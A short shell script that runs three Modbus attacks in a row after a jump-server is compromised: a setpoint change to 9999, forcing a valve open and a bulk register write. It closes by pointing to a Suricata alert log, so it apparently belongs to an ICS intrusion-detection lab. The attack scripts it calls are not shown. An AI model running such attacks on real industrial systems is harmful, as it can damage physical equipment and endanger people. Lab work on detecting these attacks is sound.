#!/bin/sh
# Run all three attacks back-to-back. Use after compromising the jump-server.
set -e
cd "$(dirname "$0")"
echo "[+] FC6 — setpoint manipulation"
python3 attack-fc6.py 9999
sleep 1
echo "[+] FC5 — force valve open"
python3 attack-fc5.py
sleep 1
echo "[+] FC16 — bulk register write"
python3 attack-fc16.py
echo "[+] done — check /var/log/suricata/fast.log on the host"
